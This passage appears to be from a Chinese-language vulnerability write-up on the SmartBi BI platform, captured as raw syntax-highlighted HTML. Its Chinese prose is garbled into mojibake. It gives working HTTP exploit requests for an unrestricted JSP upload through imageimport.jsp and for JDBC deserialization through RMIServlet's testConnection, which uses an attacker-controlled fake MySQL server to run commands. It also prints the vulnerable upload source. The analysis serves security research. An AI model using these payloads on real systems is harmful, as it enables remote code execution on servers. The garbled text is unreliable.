<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">FileResourceDAO</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getFileResource</span><span style="color: #ABB2BF">(fileResourceID);</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
</li>
<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173441869.png" srcset="/img/loading.gif" lazyload alt="image-20250811225032944"></p>
<p>å­˜åœ¨ URLLinkServiceç±»ï¼Œè¿™ä»£è¡¨æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è°ƒâ½¤è¯¥â½…æ³•çš„ä»»æ„ç±»ï¼ŒåŒæ—¶å‚æ•°å¯æ§</p>
</li>
</ol>
<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><h4 id="payloadï¼š-1"><a href="#payloadï¼š-1" class="headerlink" title="payloadï¼š"></a><strong>payloadï¼š</strong></h4><ol>
<li><p>è¿™æ˜¯ä¸€ä¸ªåå°æ¼æ´ï¼Œéœ€è¦ç™»å½•è·å–â½¤æˆ·Cookie</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173442903.png" srcset="/img/loading.gif" lazyload alt="image-20250811220431605"></p>
</li>
<li><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/designer/imageimport.jsp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:52.0</span><span style="color: #ABB2BF">) Gecko/20100</span></span>
<span class="line"><span style="color: #61AFEF">101</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Firefox/52.0</span></span>
<span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">text/html,application/xhtml+xml,application/xml</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.9</span><span style="color: #98C379">,</span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate</span></span>
<span class="line"><span style="color: #61AFEF">X-File-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">image</span></span>
<span class="line"><span style="color: #61AFEF">X-File-Name:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #98C379">.jsp</span></span>
<span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">close</span></span>
<span class="line"><span style="color: #61AFEF">Upgrade-Insecure-Requests:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">multipart/form-data</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">boundary</span><span style="color: #56B6C2">=</span><span style="color: #98C379">---------------------------292</span></span>
<span class="line"><span style="color: #61AFEF">7288396864</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">16</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">FQPassword=</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">JSESSIONID</span><span style="color: #56B6C2">=</span><span style="color: #98C379">AE628E59E970577DD994954A693517C8</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;%=</span><span style="color: #98C379">&quot;CurlySean&quot;</span><span style="color: #ABB2BF">%&gt;</span></span></code></pre></div></div></figure>
</li>
<li><p>è®¿é—®&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;image&#x2F;1.jsp</p>
<p>å‘ç°å‡ºç°CurlySean</p>
</li>
</ol>
<h4 id="æ¼æ´åˆ†æï¼š-1"><a href="#æ¼æ´åˆ†æï¼š-1" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a><strong>æ¼æ´åˆ†æï¼š</strong></h4><ol>
<li><p>smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp â½‚ä»¶</p>
<p>Smartbi\Tomcat\webapps\smartbi\vision\designer\imageimport.jsp</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">&lt;%</span><span style="color: #ABB2BF">@</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">page</span><span style="color: #E06C75"> import</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;java.io.*&quot;</span><span style="color: #56B6C2">%&gt;</span></span>
<span class="line"><span style="color: #56B6C2">&lt;%</span></span>
<span class="line"><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> path </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getServletContext</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getRealPath</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/vision/designer/images/&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">File</span><span style="color: #E06C75"> dir </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">File</span><span style="color: #E06C75">(path)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">dir</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exists</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #E5C07B">dir</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">mkdirs</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	}</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileName </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">String</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getHeader</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;X-File-Name&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ISO-8859-1&quot;</span><span style="color: #ABB2BF">),</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> fileType </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getHeader</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;X-File-Type&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">if</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">fileType</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">indexOf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;image&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setContentType</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;text/html; charset=UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">resetBuffer</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;error file type!&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">));</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	}</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">File</span><span style="color: #E06C75"> file </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">File</span><span style="color: #E06C75">(path </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> fileName)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">FileOutputStream</span><span style="color: #E06C75"> fos </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #E06C75">(file)</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> bytesRead</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] buf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #D19A66">1024</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">// 4K buffer</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #C678DD">while</span><span style="color: #E06C75"> ((bytesRead </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">(buf)</span><span style="color: #E06C75">) </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">		</span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(buf, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, bytesRead);</span></span>
<span class="line"><span style="color: #E06C75">	}</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">fos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">smartbi</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">net</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">json</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">JSONObject</span><span style="color: #E06C75"> jobj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> smartbi</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">net</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">json</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">JSONObject</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">jobj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;url&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">path</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">substring</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">path</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">lastIndexOf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;images/&quot;</span><span style="color: #ABB2BF">)) </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> fileName);</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #7F848E; font-style: italic">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">jobj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setContentType</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;text/html; charset=UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">resetBuffer</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">resultStr</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getBytes</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">));</span></span>
<span class="line"><span style="color: #E06C75">} </span><span style="color: #C678DD">catch</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">Exception</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">e</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">	</span><span style="color: #E5C07B">e</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">printStackTrace</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">}</span></span>
<span class="line"><span style="color: #56B6C2">%&gt;</span></span></code></pre></div></div></figure>

<p>é€šè¿‡æ‹¼æ¥è·å–â½‚ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œæ²¡æœ‰åˆ™åˆ›å»º </p>
<p>ä»è¯·æ±‚å¤´é‡è·å– X-File-Name ä½œä¸ºâ½‚ä»¶åï¼Œåˆ¤æ–­ X-File-Type æ˜¯å¦ä»¥ image å¼€å¤´ï¼Œä¸æ˜¯åˆ™ æŠ¥é”™ </p>
<p>ä»è¯·æ±‚ä½“ä¸­è¯»å–è¾“â¼Šæµï¼Œå†™â¼Šâ½‚ä»¶ä¸­</p>
<p>ï¼ˆå¯¹â½‚ä»¶çš„åç¼€å’Œå†…å®¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼ Jspâ½‚ä»¶å³å¯ï¼‰</p>
</li>
</ol>
<h2 id="SmartBi-JDBCååºåˆ—åŒ–"><a href="#SmartBi-JDBCååºåˆ—åŒ–" class="headerlink" title="SmartBi-JDBCååºåˆ—åŒ–"></a>SmartBi-JDBCååºåˆ—åŒ–</h2><h4 id="payloadï¼š-2"><a href="#payloadï¼š-2" class="headerlink" title="payloadï¼š"></a><strong>payloadï¼š</strong></h4><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">192.168</span><span style="color: #98C379">.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span>
<span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span><span style="color: #98C379">,zh-TW</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.7</span><span style="color: #98C379">,zh-HK</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.5</span><span style="color: #98C379">,en-US</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.3</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.2</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span>
<span class="line"><span style="color: #61AFEF">If-Modified-Since:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span>
<span class="line"><span style="color: #61AFEF">Content-Length:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">69</span></span>
<span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080</span></span>
<span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span>
<span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://192.168.1.8:18080/smartbi/vision/index.jsp</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=E5045F082547A15B8646D2E018EB591A</span></span>
<span class="line"><span style="color: #61AFEF">Priority:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">u=</span><span style="color: #D19A66">0</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">DataSourceService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">testConnection</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[{&quot;password&quot;%</span></span>
<span class="line"><span style="color: #61AFEF">3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;maxConnection&quot;</span><span style="color: #61AFEF">%3a100,</span><span style="color: #61AFEF">&quot;user&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driverType&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;MYSQL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;validationQ</span></span>
<span class="line"><span style="color: #61AFEF">uery&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;SELECT+1+FROM+DUAL&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;url&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;jdbc%3amysql%3a//xxxx.xxx.xxx.xxx%3a</span></span>
<span class="line"><span style="color: #61AFEF">3308/d9f8b01%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.</span></span>
<span class="line"><span style="color: #61AFEF">jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;name&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;JDBC&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;driver&quot;</span><span style="color: #61AFEF">%3</span></span>
<span class="line"><span style="color: #61AFEF">a</span><span style="color: #61AFEF">&quot;com.mysql.jdbc.Driver&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;id&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;desc&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;alias&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;dbCharset&quot;</span><span style="color: #61AFEF">%3</span></span>
<span class="line"><span style="color: #61AFEF">a</span><span style="color: #61AFEF">&quot;&quot;</span><span style="color: #61AFEF">,</span><span style="color: #61AFEF">&quot;identifierQuoteString&quot;</span><span style="color: #61AFEF">%3a</span><span style="color: #61AFEF">&quot;</span><span style="color: #98C379">`</span><span style="color: #61AFEF">&quot;,&quot;transactionIsolation&quot;%3a-1,&quot;validationQ</span></span>
<span class="line"><span style="color: #61AFEF">ueryMethod&quot;%3a0,&quot;dbToCharset&quot;%3a&quot;&quot;,&quot;authenticationType&quot;%3a&quot;STATIC&quot;}]</span></span></code></pre></div></div></figure>

<p>å¼¹å‡ºè®¡ç®—å™¨</p>
<p>é¦–å…ˆæ­å»ºåœ¨å…¬â½¹VPSä¸Šæ­å»ºFakeMysqlæœåŠ¡å™¨</p>
<p>å‘é€æ•°æ®åŒ…åï¼Œæˆ‘ä»¬çš„smartBiæœåŠ¡å™¨å°è¯•è¿æ¥fakeMysqlæœåŠ¡å™¨ï¼Œé€šè¿‡ååºåˆ—åŒ–å³å¯æˆåŠŸæ‰§â¾å‘½ä»¤</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173447060.png" srcset="/img/loading.gif" lazyload alt="image-20250812181350575"></p>
<h4 id="æ¼æ´åˆ†æï¼š-2"><a href="#æ¼æ´åˆ†æï¼š-2" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a><strong>æ¼æ´åˆ†æï¼š</strong></h4><ol>
<li><p>é€šè¿‡æŸ¥æ‰¾SmartBiçš„JaråŒ…ï¼Œå‘ç° mysql-connector-java çš„ä¾èµ–ç‰ˆæœ¬ä¸º5.1.44ï¼Œæ˜¯å­˜åœ¨JDBCååºåˆ— åŒ–æ¼æ´çš„ç‰ˆæœ¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173448639.png" srcset="/img/loading.gif" lazyload alt="image-20250812181512068"></p>
</li>
<li><p>éœ€è¦æ‰¾åˆ°â¼€ä¸ªå‘åºåˆ—åŒ–é“¾</p>
<p>pom.xmlä¸­ï¼Œå‘ç° common-collections ä¾èµ–ï¼Œç‰ˆæœ¬ 3.2.1 ï¼Œå­˜åœ¨CCååºåˆ—åŒ–</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173450003.png" srcset="/img/loading.gif" lazyload alt="image-20250812182127446"></p>
</li>
<li><p>é…ç½®payloadæ—¶ï¼Œé…ç½®K1é“¾â¼¦ï¼Œâ½£æˆpayloadå³å¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173451624.png" srcset="/img/loading.gif" lazyload alt="image-20250812182159537"></p>
</li>
<li><p>æ¼æ´äº§â½£ç‚¹åœ¨ DataSourceService ä¸­çš„ testConnection ä¸­</p>
